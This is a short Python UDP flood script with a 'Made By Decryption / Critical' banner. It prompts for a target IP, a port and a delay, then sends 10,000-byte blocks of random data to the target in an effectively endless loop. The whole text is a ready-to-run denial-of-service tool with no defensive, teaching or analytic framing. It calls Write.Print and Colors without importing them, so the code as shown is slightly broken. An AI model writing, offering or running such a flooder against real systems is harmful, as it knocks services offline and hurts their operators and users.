import socket, random, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("")
Write.Print("Made By Decryption / Critical", Colors.red_to_yellow)
print("")
ip = input("Enter IP Here\n")
print("")
port = int(input("Enter Port Here\n"))
print("")
sleep = float(input("Enter dely time\n"))

s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
